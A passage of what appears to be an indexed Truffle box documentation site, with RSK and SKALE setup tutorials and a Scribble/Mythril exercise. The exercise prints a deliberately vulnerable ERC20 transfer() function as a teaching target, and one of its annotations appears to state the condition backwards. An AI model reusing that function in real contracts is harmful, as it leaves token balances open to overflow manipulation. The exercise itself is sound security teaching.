`storedData`\\n\\n5. Compile and migrate the smart contract. Note inside the development console we don\\'t preface commands with truffle.\\n\\n> To make sure you\\'re in the development console, the command prompt must be `truffle(develop)>`\\n\\n```shell\\ncompile\\n```\\nThe `compile output` should be similar to:\\n\\n![truffle compile](/images/rsk-starter-box-02.png)\\n\\n```shell\\nmigrate\\n```\\n\\nAnd the `migrate output` should be similar to:\\n\\n![truffle migrate](/images/rsk-starter-box-03.png)\\n\\n6. Running contract tests.\\n\\nOur box also comes with the file `TestSimpleStorage.js` for testing the smart contract. You can check it out in the `test` folder.\\n\\nRun this command in the development console:\\n\\n```shell\\ntest\\n```\\n\\nThis `test output` should be similar to:\\n\\n![truffle test](/images/rsk-starter-box-04.png)\\n\\n**NOTE**: This box is the starting point for the RSK tutorial [Using rsk-starter-box](https://developers.rsk.co/tutorials/truffle-boxes/rsk-starter-box/).\\n\\n## Using RSK networks\\n\\nTruffle makes developing on RSK easier because we can configure custom networks for RSK. The networks are already configured in the `truffle-config.js` file.\\n\\n### Setup an account & get R-BTC\\n\\n- Get an address using [these instructions](https://developers.rsk.co/rsk/architecture/account-based/ \"Account Based RSK Addresses - RSK Developers Portal\").\\n- For the RSK Testnet, get tR-BTC from [our faucet](https://faucet.testnet.rsk.co/).\\n- For the RSK Mainnet, get R-BTC from [an exchange](https://www.rsk.co/#exchanges-rsk).\\n\\nTake a look `truffle-config.js` file to realize that we are using `HDWalletProvider` with RSK Networks derivations path:\\n- RSK Testnet dpath: `m/44\\xe2\\x80\\x99/37310\\xe2\\x80\\x99/0\\xe2\\x80\\x99/0`\\n- RSK Mainnet dpath: `m/44\\xe2\\x80\\x99/137\\xe2\\x80\\x99/0\\xe2\\x80\\x99/0`\\n\\nFor more information check [RSKIP57](https://github.com/rsksmart/RSKIPs/blob/master/IPs/RSKIP57.md).\\n\\n### Update your mnemonic\\n\\nPaste the wallet mnemonic in the file `.secret`, located in the folder project, and save it.\\n\\n### Setup the gas price\\n\\n**Gas** is the internal pricing for running a transaction or contract. When you send tokens, interact with a contract, send R-BTC, or do anything else on the blockchain, you must pay for that computation. That payment is calculated as gas. In RSK, this is paid in **R-BTC**.\\nThe **minimumGasPrice** is written in the block header by miners and establishes the minimum gas price that a transaction should have in order to be included in that block.\\n\\nTo update the **minimumGasPrice** in our project run this query using cURL:\\n\\n**Testnet**\\n\\n```shell\\ncurl https://public-node.testnet.rsk.co/ -X POST -H \"Content-Type: application/json\" \\\\\\n --data \\'{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}\\' \\\\\\n > .minimum-gas-price-testnet.json\\n```\\n\\n**Mainnet**\\n\\n```shell\\ncurl https://public-node.rsk.co/ -X POST -H \"Content-Type: application/json\" \\\\\\n --data \\'{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}\\' \\\\\\n > .minimum-gas-price-mainnet.json\\n```\\n\\nThis query saved the details of latest block to \\nfile .minimum-gas-price-testnet.json \\nor .minimum-gas-price-mainnet.json, respectively.\\n\\nIn the `truffle-config.js`, we are reading the parameter `minimumGasPrice` in each json file.\\n\\nFor more information about the **Gas** and **minimumGasPrice** please go [here](https://developers.rsk.co/rsk/rbtc/gas/ \"Gas - RSK Developers Portal\").\\n\\n### Connect to RSK network\\n\\nRun the truffle console for any RSK network.\\n\\n```shell\\n# Console for Mainnet\\ntruffle console --network mainnet\\n\\n# Console forn Testnet\\ntruffle console --network testnet\\n```\\n\\n### Compile and migrate the smart contracts\\n\\nWe will do it running the below commands directly in the terminal, without using the truffle console, this is to show you an alternative.\\n\\nOn any of the networks, run this commands in a terminal (not in Truffle console):\\n\\n```shell\\ntruffle compile\\n\\ntruffle migrate\\n```\\n\\n## Next steps\\n\\n- **Go to tutorial**\\n\\nGo to the tutorial [Using rsk-starter-box](https://developers.rsk.co/tutorials/truffle-boxes/rsk-starter-box/) to learn how to interact with `SimpleStorage.sol`. Also, we covered all the steps with more details, explanations, and images.\\n\\n- **Find more documentation**\\n\\nCheck out the [RSK developers portal](https://developers.rsk.co/).\\n\\n- **Do you have questions?**\\n\\nAsk in [RSK chat](https://gitter.im/rsksmart/getting-started).\\n'","title":"Index"},{"location":"boxes/rsk-token-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS rsk-token-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'# RSK Truffle Token Box\\n\\nTruffle box with everything you need to start creating a token using Open Zeppelin smart contracts library in Truffle framework, connected to a RSK network.\\nIt includes network configurations for local node (regtest), Testnet and Mainnet.\\n\\n## Requirements\\n\\nThere are a few technical requirements before we start. \\nTo use `Truffle boxes`, you need to have installed in your computer:\\n\\n- Git\\n- a POSIX compliant shell\\n- cURL\\n- Node.js and NPM\\n- a code editor\\n\\nIf you don\\'t have any of them installed, go to the tutorial [Truffle boxes prerequisites](https://developers.rsk.co/tutorials/truffle-boxes/truffle-boxes-prerequisites/) which have all the instructions to setup these requirements.\\n\\n**Truffle framework**\\n\\nOnce you have those requirements installed, you only need one command to install `Truffle`.\\nIt is better to do it globally:\\n\\n```shell\\nnpm install -g truffle\\n```\\n\\n## Installation\\n\\n1. Create a new folder. \\nFor example, create the folder `rsk-token`.\\nNavigate to the folder in the terminal.\\n\\n```shell\\nmkdir rsk-token\\ncd rsk-token\\n```\\n\\n2. Run the unbox command. \\nThis also takes care of installing the necessary dependencies and it can take some time.\\n\\n```shell\\ntruffle unbox rsksmart/rsk-token-box\\n```\\n\\nThis is the result using Windows OS:\\n\\n![truffle unbox](/images/image-01.png)\\n\\n## Development console\\n\\nTruffle has an interactive console that also spawns a development blockchain. This is very useful for compiling, deploying and testing locally.\\n\\n3. Run the development console. This command is successful if you see a list of 10 accounts, a mnemonic and the command prompt is now `truffle(develop)>`\\n\\n```shell\\ntruffle develop\\n```\\n\\nYou will now be in the truffle develop console with seeded accounts and their associated private keys listed.\\n\\n```txt\\nC:\\\\RSK\\\\rsk-next>truffle develop\\n\\nTruffle Develop started at http://127.0.0.1:8545/\\n\\nAccounts:\\n(0) 0x1056f747cf4bc7710e178b2aeed4eb8c8506c728\\n(1) 0x45a71c00382c2898b5d6fae69a6f7bfe6edab80c\\n(2) 0x1596384706dc9ac4cca7f50279a4abe591d6c3fe\\n(3) 0x9576d0a496b645baa64f22aceb2328e7468d4113\\n(4) 0xd431572eef7d77584d944c1809398a155e89f830\\n(5) 0x92c111839718fe0800fadccc67068b40b8524a0f\\n(6) 0x6da22b5a027146619bfe6704957f7f36ff029c48\\n(7) 0x2c3a82d8c3993f8c80dcaf91025437bd057df867\\n(8) 0xc43ae7a44f7deb759177b7093f06512a0a9ff5d7\\n(9) 0xe61bf00cd7dce248449cfe58f23a4ef7d542bc0b\\n\\nPrivate Keys:\\n(0) f32f32839fe27ad906b63eafb326f26fed95c231e3c5e33c7cdd08f62db63167\\n(1) ebef990088f27f6ef13b5e52a77d5dcc5a76862a701908c586d01b6fe93562b3\\n(2) 598ccae5e4436fedeb0e798c0d254789c55a63401ebfc3ae8ddde29634ddfcde\\n(3) 09934b80f391e0024b8cb00cd73790fdf64c4d0509e144766414fee317cd3f4e\\n(4) ac745b84b6574b5738d364b43e0d471c9d5107504acc709c90f6f091b78c751b\\n(5) 449654cde095f2349113ef12a93e139b4302bc95adb3619d08adf53dde9b8847\\n(6) c217f12a89c352fc70b5f1bd5742314b4fb1bb1e35cb779fdb3c2390106355db\\n(7) 1d4c74dfa4e99e161130c18cc63938bb120a128cefbf1b9188efc678bf5722cb\\n(8) 0f44e0becf2e090db498a1b747d2a758fcc81fb0241f350d61117a9c6b1fa82e\\n(9) 85218c5eec657470dafeb09e6f7101f91d21bfe822fbeeecfc9275f798662a63\\n\\nMnemonic: virtual valve razor retreat either turn possible student grief engage attract fiber\\n\\n\\xe2\\x9a\\xa0\\xef\\xb8\\x8f Important \\xe2\\x9a\\xa0\\xef\\xb8\\x8f : This mnemonic was created for you by Truffle. It is not secure.\\nEnsure you do not use it on production blockchains, or else you risk losing funds.\\n\\ntruffle(develop)>\\n```\\n\\n## Token.sol\\n\\nTake a look at the smart contract `Token.sol`. You can check it out in folder `contracts`.\\n\\n![Token.sol](/images/image-19.png)\\n\\n> Token.sol has only 7 code lines!\\n\\nThis smart contract is a mintable [ERC20](https://eips.ethereum.org/EIPS/eip-20) token. This means that, in addition to the standard ERC20 specification, it has a function for issuing new tokens.\\n\\nTo create our ERC20 Token, we will import `ERC20Mintable` from Open Zeppelin. \\nThis library itself imports several other libraries such as `SafeMath.sol`, the standards for this kind of token, and the capability to mint tokens.\\n\\nInside the token, we define some basic information about the token: `name`, `symbol`, and number of `decimals` for the precision.\\n\\nTo inherit the library\\'s attributes and functions, we simply define our contract as a `ERC20Mintable` using the `is` keyword in this way.\\n\\n4. Compile the smart contract. \\n\\nNote inside the development console we don\\'t preface commands with `truffle`.\\n\\n> To make sure you\\'re in the development console, the command prompt must be `truffle(develop)>`\\n\\n```shell\\ncompile\\n```\\n\\nThe `compile output` should be similar to:\\n\\n![truffle compile](/images/image-02.png)\\n\\n5. Deploy (migrate) the smart contract.\\n\\n```shell\\nmigrate\\n```\\n\\nAnd the `migrate output` should be similar to:\\n\\n![truffle migrate](/images/image-03.png)\\n\\n6. Running contract tests.\\n\\nThis Truffle box also comes with the file `TestToken.js` which include some examples for testing the smart contract. \\nYou can check it out in the `test` folder.\\n\\nThere are many other tests which can be done to check an ERC20 token.\\n\\nRun this command in the development console:\\n\\n```shell\\ntest\\n```\\n\\nThis `test output` should be similar to:\\n\\n![truffle test](/images/image-04.png)\\n\\nNote the command varies slightly if you\\'re in or outside of the development console.\\n\\n```javascript\\n// inside the development console.\\ntest\\n\\n// outside the development console.\\ntruffle test\\n```\\n\\n## Interact with the token using Truffle console \\n\\n1. Get your accounts in Truffle console.\\n\\nIn the Truffle console, enter:\\n\\n```javascript\\nconst accounts = await web3.eth.getAccounts()\\n```\\n\\nDon\\xe2\\x80\\x99t worry about the `undefined` return, it is ok. See the addresses after it by entering the command below:\\n\\n```javascript\\naccounts\\n```\\n\\nAnd to view each account:\\n\\n```javascript\\naccounts[0]\\naccounts[1]\\n```\\n\\nTake a look in the results:\\n\\n![accounts](/images/image-05.png)\\n\\n2. Interact with the token using Truffle console.\\n\\nFirst of all, connect with your token\\n\\n```javascript\\nconst token = await Token.deployed()\\n```\\n\\n3. Confirm if our instance is OK.\\n\\nEnter the instance\\xe2\\x80\\x99s name: `token`, then `.`, without space hit the TAB button twice to trigger auto-complete as seen below. \\nThis will display the published address of the smart contract, and the transaction hash for its deployment, among other things, including all public variables and methods available.\\n\\n```javascript\\ntoken. [TAB] [TAB]\\n```\\n\\n![token tab tab](/images/image-06.png)\\n\\n4. Check the total supply\\n\\nTo check if we have tokens already minted, call the `totalSupply` function:\\n\\n```javascript\\n(await token.totalSupply()).toString()\\n```\\n\\nThe returned value is 0, which is expected, since we did not perform any initial mint when we deployed the token.\\n\\n5. Check the token balance\\n\\nTo check the balance of an account, call the `balanceOf` function. For example, to check the balance of account 0:\\n\\n```javascript\\n(await token.balanceOf(accounts[0])).toString()\\n```\\n\\nTake a look in the results of total supply and balanceOf:\\n\\n![total supply and balanceOf 0](/images/image-09.png)\\n\\nThe returned value is also 0, which is expected, since we did not make any initial mint when we deployed the token, and by definition no accounts can have any tokens yet.\\n\\n6. Mint tokens\\n\\nRun this command:\\n\\n```javascript\\ntoken.mint(accounts[0], 10000)\\n```\\n\\nThis command sent a transaction to mint 100 tokens for account 0. \\n\\n![token.mint account 0](/images/image-10.png)\\n\\nYou can also mint to a specific address, `0xa52515946DAABe072f446Cc014a4eaA93fb9Fd79`:\\n\\n```javascript\\ntoken.mint(\"0xa52515946DAABe072f446Cc014a4eaA93fb9Fd79\", 10000)\\n```\\n\\n![token.mint address](/images/image-11.png)\\n\\n7. Reconfirm the token balance\\n\\nCheck the balance of account 0 again:\\n\\n```javascript\\n(await token.balanceOf(accounts[0])).toString()\\n```\\n\\nThe returned value is 10000, which is 100 with 2 decimal places of precision. This is exactly what we expected, as we issued 100 tokens\\n\\nAlso, you can get the balance of a specific address, for example, `0xa52515946DAABe072f446Cc014a4eaA93fb9Fd79`:\\n\\n```javascript\\n(await token.balanceOf(\"0xa52515946DAABe072f446Cc014a4eaA93fb9Fd79\")).toString()\\n```\\n\\nTake a look in the results:\\n\\n![balanceOf account 0 and address with 10000](/images/image-13.png)\\n\\n8. Check the total supply (again)\\n\\nCheck the total supply again:\\n\\n```javascript\\n(await token.totalSupply()).toString()\\n```\\n\\n![totalSupply 20000](/images/image-15.png)\\n\\nThe returned value is 20000, which is 200 with 2 decimal places of precision. \\nAfter minting 100 tokens for 2 accounts, this is perfect!\\n\\n9. Transfer tokens\\n\\nTo transfer 40 tokens from account 0 to account 2. \\nThis can be done by calling the `transfer` function.\\n\\n```javascript\\ntoken.transfer(accounts[2], 4000, {from: accounts[0]})\\n```\\n\\n![token.transfer](/images/image-16.png)\\n\\nAccount 2 had no tokens before the transfer, and now it should have 40. Account 1 must have 60 tokens. Also the total supply will be the same.\\n\\nLet\\xe2\\x80\\x99s check the balance of each account and the total supply:\\n\\n```javascript\\n(await token.balanceOf(accounts[2])).toString()\\n(await token.balanceOf(accounts[0])).toString()\\n(await token.totalSupply()).toString()\\n```\\n\\nTake a look in the results:\\n\\n![balances after transfer](/images/image-17.png)\\n\\nGreat! The balances of both accounts and the total supply are correct.\\n\\n### Exit Truffle console\\n\\nIn the Truffle console, enter this command to exit the terminal:\\n\\n```shell\\n.exit\\n```\\n\\n## Using RSK networks\\n\\nThis Truffle box is already configured to connect to three RSK networks: \\n\\n1. regtest (local node)\\n2. testnet\\n3. mainnet\\n\\nTestnet will be used here. \\n\\nWe need to do some tasks:\\n\\n- Setup an account and get R-BTC\\n- Update RSK network gas price\\n- Connect to an RSK network\\n- Deploy in the network of your choose\\n\\n### Setup an account & get R-BTC\\n\\n1. Create a wallet\\n\\nThe easy way to setup an account is using a web3 wallet injected in the browser.\\nSome options are:\\n- [Metamask](https://metamask.io/)\\n- [Nifty](https://www.poa.network/for-users/nifty-wallet)\\n\\nSelect the RSK Network in the web wallet.\\n- Nifty: select in the dropdown list\\n- Metamask: go to [RSK Testnet](https://developers.rsk.co/wallet/use/metamask/) to configure it in `Custom RPC`\\n\\nYou can learn more about [account based RSK addresses](https://developers.rsk.co/rsk/architecture/account-based/ \"Account based RSK addresses - RSK Developers Portal\").\\n\\nTake a look `truffle-config.js` file to realize that we are using `HDWalletProvider` with RSK Networks derivations path:\\n- RSK Testnet dpath: `m/44\\xe2\\x80\\x99/37310\\xe2\\x80\\x99/0\\xe2\\x80\\x99/0`\\n- RSK Mainnet dpath: `m/44\\xe2\\x80\\x99/137\\xe2\\x80\\x99/0\\xe2\\x80\\x99/0`\\n\\nFor more information check [RSKIP57](https://github.com/rsksmart/RSKIPs/blob/master/IPs/RSKIP57.md).\\n\\n2. Update `.secret` file\\n\\nAfter create your wallet, update your mnemonic in the file `.secret`, located in the folder project, and save it.\\n\\n3. Get some R-BTCs:\\n- For the RSK Testnet, get tR-BTC from [our faucet](https://faucet.testnet.rsk.co/).\\n- For the RSK Mainnet, get R-BTC from [an exchange](https://developers.rsk.co/rsk/rbtc/).\\n\\n### Setup the gas price\\n\\n**Gas** is the internal pricing for running a transaction or contract. When you send tokens, interact with a contract, send R-BTC, or do anything else on the blockchain, you must pay for that computation. That payment is calculated as gas. In RSK, this is paid in **R-BTC**.\\nThe **minimumGasPrice** is written in the block header by miners and establishes the minimum gas price that a transaction should have in order to be included in that block.\\n\\nTo update the **minimumGasPrice** in our project run this query using cURL:\\n\\n**Testnet**\\n\\n```shell\\ncurl https://public-node.testnet.rsk.co/ -X POST -H \"Content-Type: application/json\" \\\\\\n --data \\'{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}\\' \\\\\\n > .minimum-gas-price-testnet.json\\n```\\n\\n**Mainnet**\\n\\n```shell\\ncurl https://public-node.rsk.co/ -X POST -H \"Content-Type: application/json\" \\\\\\n --data \\'{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}\\' \\\\\\n > .minimum-gas-price-mainnet.json\\n```\\n\\nThis query saved the details of latest block to \\nfile .minimum-gas-price-testnet.json \\nor .minimum-gas-price-mainnet.json, respectively.\\n\\nIn the `truffle-config.js`, we are reading the parameter `minimumGasPrice` in each json file.\\n\\nFor more information about the **Gas** and **minimumGasPrice** please go to the [gas page](https://developers.rsk.co/rsk/rbtc/gas/ \"Gas - RSK Developers Portal\").\\n\\n### Connect to RSK Testnet or Mainnet\\n\\nRun the development console for any RSK network.\\n\\n```shell\\n# Console for Testnet\\ntruffle console --network testnet\\n\\n# Console for Mainnet\\ntruffle console --network mainnet\\n```\\n\\n### Test the connection to RSK network\\n\\nOn any of the networks, run this commands in the Truffle console:\\n\\n#### Block number\\nShows the last block number.\\n\\n```javascript\\n(await web3.eth.getBlockNumber()).toString()\\n```\\n#### Network ID\\n\\nTo get the network ID, run this command:\\n\\n```javascript\\n(await web3.eth.net.getId()).toString()\\n```\\n\\nList of network IDs:\\n- mainnet: 30\\n- testnet: 31\\n- regtest (local node): 33\\n\\nExit the Truffle console:\\n\\n```shell\\n.exit\\n```\\n\\n### Compile and migrate the smart contracts. \\n\\nWe will do it running the below commands directly in the terminal, without using the truffle console, this is to show you an alternative.\\n\\nOn any of the networks, run this commands in a terminal (not in Truffle console).\\nTo use Testnet or Mainnet, you need to specify this using the parameter `-- network`:\\n\\n```shell\\ntruffle migrate --network testnet\\n```\\n\\nThe migrate process in a real blockchain takes more time, because Truffle creates some transactions which need to be mined on the blockchain.\\n\\n### Where to go from here\\n\\nInteract with the token published on an RSK network using Truffle console, doing the same steps which was done before:\\n\\n- Get your accounts\\n- Connect with your token\\n- Check the total supply or the token balance\\n- Mint tokens\\n- Transfer tokens\\n\\nAt this point, we have installed all requirements and created a token using Truffle framework and Open Zeppelin smart contracts library,\\nconnected to an RSK local node (Regtest), the RSK Testnet and the RSK Mainnet.\\n\\n**Find more documentation**\\n\\nCheck out the [RSK developers portal](https://developers.rsk.co/).\\n\\n**Do you have questions?**\\n\\nAsk in the [RSK chat](https://gitter.im/rsksmart/getting-started).\\n'","title":"Index"},{"location":"boxes/scoreboard/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS scoreboard CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/scribble/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS scribble-exercise-1 CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'# Scribble Exercise 1\\n\\nIn this exercise we\\'re going to have a look at a vulnerable ERC20 smart contract. \\nWe\\'ll use Scribble to annotate it with properties, and use Mythril to automatically check the properties (and find bugs \\xf0\\x9f\\x90\\x9b).\\n\\n### Handy Links\\nScribble Repository -> https://github.com/ConsenSys/Scribble\\n\\nMythril Repository -> https://github.com/ConsenSys/Mythril\\n\\nScribble Docs \\xf0\\x9f\\x93\\x9a -> https://docs.scribble.codes/\\n\\n### Installation\\n```\\n# We\\'ll use Mythril to automatically test specifications\\npip3 install mythril\\n\\n# Make sure to use node 10-12\\nnpm install eth-scribble --global\\nnpm install truffle --global\\nnpm install ganache-cli --global\\n```\\n\\n### Setting up the target\\n\\n```\\nmkdir exercise-1\\ncd exercise-1\\ntruffle unbox ConsenSys/scribble-exercise-1\\n```\\n\\n\\n### Finding the vulnerability\\nHave a look at the `transfer()` function:\\n```\\nfunction transfer(address _to, uint256 _value) external returns (bool) {\\n address from = msg.sender;\\n require(_value < = _balances[from]);\\n\\n uint256 newBalanceFrom = _balances[from] - _value;\\n uint256 newBalanceTo = _balances[_to] + _value;\\n _balances[from] = newBalanceFrom;\\n _balances[_to] = newBalanceTo;\\n\\n emit Transfer(msg.sender, _to, _value);\\n return true;\\n}\\n```\\n\\n### Adding annotations\\nProperties that make sense:\\n \\n If the transfer function succeeds then the recipient had sufficient balance at the start \\n \\n \\n/// #if_succeeds {:msg \"The sender has sufficient balance at the start\"} old(_balances[msg.sender] < = _value)\\nfunction transfer(address _to, uint256 _value) external returns (bool) {\\n ...\\n}\\n \\n \\n\\n \\n If the transfer succeeds then the sender will have `_value` subtracted from it\\xe2\\x80\\x99s balance (unless you transfer to yourself) \\n \\n \\n/// #if_succeeds {:msg \"The sender has _value less balance\"} msg.sender != _to ==> old(_balances[msg.sender]) - _value == _balances[msg.sender]; \\nfunction transfer(address _to, uint256 _value) external returns (bool) {\\n ...\\n}\\n \\n \\n\\n \\n If the transfer succeeds then the receiver will have `_value` added to it\\xe2\\x80\\x99s balance (unless you transfer to yourself) \\n \\n \\n/// #if_succeeds {:msg \"The receiver receives _value\"} msg.sender != _to ==> old(_balances[_to]) + _value == _balances[_to]; \\nfunction transfer(address _to, uint256 _value) external returns (bool) {\\n ...\\n}\\n \\n \\n\\n \\n If the transfer succeeds then the sum of the balances between the sender and receiver remains he same \\n \\n \\n/// #if_succeeds {:msg \"Transfer does not modify the sum of balances\" } old(_balances[_to]) + old(_balances[msg.sender]) == _balances[_to] + _balances[msg.sender];\\nfunction transfer(address _to, uint256 _value) external returns (bool) {\\n ...\\n}\\n \\n \\n\\n### Finding the bug using Mythril\\n\\n```\\nscribble --arm -m files ./contracts/vulnerableERC20.sol\\nmyth analyze ./contracts/vulnerableERC20.sol\\n\\n# Always clean up after yourself \\xf0\\x9f\\x98\\x89\\nscribble --disarm -m files ./contracts/vulnerableERC20.sol\\n```\\n'","title":"Index"},{"location":"boxes/skale-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS truffle-skale-network-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'\\n\\n# SKALE Network Box\\n\\n![box-artwork](https://github.com/skalenetwork/skale-box/blob/master/truffle-skale.png?raw=true)\\n \\n- [Overview](#overview)\\n- [Requirements](#requirements)\\n- [Install](#installation)\\n- [Setup](#setup)\\n\\t* [Get a SKALE Chain](#1-get-a-skale-chain)\\n\\t* [Get a Wallet](#2-get-a-wallet)\\n \\t* [Fund your Wallet with skETH](#fund-your-wallet-with-sketh)\\n\\t* [Update Truffle Config](#3-update-truffle-config)\\n- [Deploy to the SKALE Network](#deploy-to-the-skale-network)\\n- [Test](#testing)\\n- [SKALE Network Resource Links](#resources)\\n- [Support](#support)\\n\\n ## Overview\\n\\nWelcome to the SKALE Network Box! This Truffle SKALE Network box provides you with all the basics necessary to kick-start scaling your application with the SKALE Network. You can find out more information about getting started with SKALE within the [Developer Getting Started Guide](https://skale.network/docs/developers/getting-started/beginner).\\n\\nThis box comes with everything you need to start using smart contracts from a react app on the SKALE Network. \\n\\nThe SKALE Network is fully decentralized, and is supported by a validator community represented by over 48 validator orgs running over 150 nodes. Since the network is EVM compatible, all existing tools built for Ethereum will work directly within the SKALE Network as well. For example, the SKALE Network is fully compatible with the all Ethereum native wallets. Check out the SKALE Network Dev Portal for easy integration scripts fo connecting your favorite wallet, [here](https://skale.network/docs/developers/wallets/getting-started).\\n\\nFor example, connecting MetaMask to SKALE in a seamless way can be seen in this document:\\n\\nhttps://skale.network/docs/developers/wallets/metamask\\n\\n**All SKALE Chains contain the following features:**\\n\\n* Full EVM Support for Solidity Smart Contracts\\n* Interchain Messaging for managing Tokens (ETH, ERC20, ERC721, etc.)\\n* Decentralized Storage\\n* Integration Support for All Ethereum Tools\\n* Wallet Support for API and HSM Wallets\\n\\nLastly, the SKALE Network uses a [unique combination of several technologies](https://skale.network/blog/technical-highlights) to achieve scalability, security, interoperability, and progressive decentralization:\\n\\n| Technology | Impact |\\n|--|--|\\n| Pooled Validation Proof-of-Stake | [Scalable security model across validators and delegators](https://skale.network/blog/the-skale-network-why-randomness-rotation-and-incentives-are-critical-for-secure-scaling/) |\\n|Hybrid Container Architecture | [Agile allocation of on-demand composable compute resources across the network](https://skale.network/blog/containerization-the-future-of-decentralized-infrastructure/) |\\n| Threshold Cryptography | Supermajority signature signing with ABBA consensus supports Byzantine Fault Tolerance and resolves [data-availability](https://skale.network/blog/the-data-availability-problem/) issues |\\n| Trusted-Execution Environment | [Fast block signing and multiple chain support using threshold cryptography](https://github.com/skalenetwork/SGXWallet) |\\n| Asynchronous Binary Byzantine Agreement (ABBA) Consensus | [Mathematically provable, fast-finality, leaderless, and Byzantine Fault Tolerant](https://skale.network/blog/skale-consensus/) |\\n| Ethereum Network | Public, open-source, and decentralized operation of the SKALE Network via SKALE Manager contracts |\\n\\n## Requirements\\n\\nThe SKALE Network box has the following requirements:\\n\\n- [Node.js](https://nodejs.org/) 12.x or later\\n- [NPM](https://docs.npmjs.com/cli/) version 5.2 or later\\n- Windows, Linux or MacOS\\n\\n## Installation\\n\\n```bash\\n\\n$ truffle unbox skalenetwork/truffle-skale-network-box\\n$ npm install\\n\\n```\\n\\n## Setup\\n\\n### 1) Get a SKALE Chain\\n\\nThe SKALE Network is a multichain platform, and there are many ways to get access to the SKALE Network testing environments. To obtain your SKALE Chain endpoint and Chain ID, check out the [SKALE Network getting started guide](https://skale.network/docs/developers/getting-started/beginner).\\n\\n> Alternatively, for faster testing please feel free to use the available community SKALE Chains listed [here](https://forum.skale.network/t/skale-chain-sdk).\\n\\n### 2) Get a Wallet\\nThe SKALE Network works with a variety of wallet solutions. If you already have a wallet and private key to use, you can skip this step and go to the next section: [Update Truffle Config](#update-truffle-config).\\n\\nYou can pick and setup your favorite wallet from the documentation [here](https://skale.network/docs/developers/wallets/getting-started).\\n\\nWe recommend starting with MetaMask, and obtaining a wallet address and private key to use for testing from the [MetaMask wallet](https://metamask.io/).\\n\\n#### Fund your Wallet with skETH\\nSKALE Chains enable dApps to run gasless transactions. This provides an effective way to scale your dApp not only for speed but also to scale economically. However, SKALE Chains do require skETH to conduct transactions \\xe2\\x80\\x93 this skETH is SKALE Chain \"fake\" ETH with no economic value, but provides a way for dApps to facilitate permissive access to SKALE Chains and protects against DDoS attacks.\\n\\nYou can learn more about skETH [here](https://skale.network/docs/developers/skale-chain-eth).\\n\\n> If you are using the community SKALE Chains, you can simply head over to the SKALE testnet faucet to obtain skETH for using your SKALE Chain. You will need both your SKALE Chain endpoint and your wallet address to obtain skETH from the faucet. \\n\\n### 3) Update Truffle Config\\n\\nYou can add the SKALE Chain endpoint and private key directly into the `truffle-config.js` file by replacing the following:\\n\\n```\\nconst privateKey = process.env.PRIVATE_KEY;\\nconst skale = process.env.SKALE_CHAIN;\\n```\\n\\nFor example:\\n```\\nconst privateKey = \"0x0000000000000000000000000000000000000000000000000000000000000000\";\\nconst skale = \"https://this-is-my-skale-chain.com:1234\";\\n```\\n\\nA more secure way would be to leave the `truffle-config.js` as is, and create a `.env` file at the root directory of your project to hold onto your private key and SKALE Chain endpoint.\\n\\nYour `.env` file should look like:\\n\\n```\\nSKALE_CHAIN=https://this-is-my-skale-chain.com:1234 \\nPRIVATE_KEY=0x0000000000000000000000000000000000000000000000000000000000000000\\n```\\n\\nTo learn more about using environment variables within a `.env` file plese see:\\n\\nhttps://www.npmjs.com/package/dotenv\\n\\n#### Using a mnemonic\\n\\nIf you\\'d prefer to use a mnemonic (vs a private key), you can just omit the `PRIVATE_KEY` entry in your `.env` file and include a `MNEMONIC` entry instead. Note that `HDWalletProvider` will use the first account that\\'s generated from the mnemonic. For example:\\n\\n```\\nSKALE_CHAIN=https://this-is-my-skale-chain.com:1234 \\nMNEMONIC=test test test test test test test test test test test test\\n```\\n\\n## Deploy to the SKALE Network\\nYou can use Truffle to compile and migrate your smart contracts to the SKALE Network. The following command will compile and migrate the smart contract(s) to SKALE:\\n\\n```\\ntruffle migrate --network skale --compile-all --config=truffle-config.skale.js\\n```\\n\\n\\nFor more information on available Truffle commands, please see the Truffle documentation here:\\n\\nhttps://www.trufflesuite.com/docs/truffle/reference/truffle-commands\\n\\n\\n\\n## Testing\\nTruffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you\\'re in or outside of the development console.\\n\\n ```\\n // inside the truffle development console.\\n test --network skale --config=truffle-config.skale.js\\n\\n // outside the truffle development console.\\n truffle test --network skale --config=truffle-config.skale.js\\n ```\\n## Resources\\n\\n**SKALE Network Resources Links**\\n- [Website](https://skale.network)\\n- [Blog](https://skale.network/blog)\\n- [Github](https://github.com/skalenetwork)\\n- [Whitepaper](https://skale.network/whitepaper)\\n- [Developer Docs](https://skale.network/docs/developers/overview)\\n\\n**SKALE Network Community Links**\\n- [Discord](http://skale.chat)\\n- [Twitter](https://twitter.com/skalenetwork)\\n- [Telegram](https://t.me/skaleofficial)\\n\\n## Support\\n\\nSupport for this box is available via the Truffle community [here](https://www.trufflesuite.com/community). In addition, SKALE Network support is available 